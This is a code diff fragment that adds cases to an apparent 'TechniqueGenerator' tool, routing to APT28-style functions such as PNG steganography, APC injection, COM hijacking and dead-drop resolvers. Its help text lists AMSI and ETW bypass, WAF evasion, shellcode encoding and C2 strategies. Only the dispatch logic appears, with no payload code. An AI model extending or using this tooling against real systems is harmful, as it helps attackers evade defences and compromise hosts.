+      case 'apt28_png_stego':
+        output = apt28PNGSteganography()
+        break
+      case 'apt28_memory_transition':
+        output = apt28MemoryPermissionTransition()
+        break
+      case 'apt28_apc_inject':
+        output = apt28APCInjection()
+        break
+      case 'apt28_com_hijack':
+        output = apt28COMHijacking()
+        break
+      case 'apt28_dead_drop':
+        output = apt28DeadDropResolver()
+        break
+      case 'apt28_webdav_unc':
+        output = apt28WebDAVUNC()
+        break
       case 'custom':
-        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy)`
+        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy/sliver_strategy/apt28_strategy)`
         break
       default:
         return { content: `Unknown technique: ${technique}`, isError: true }
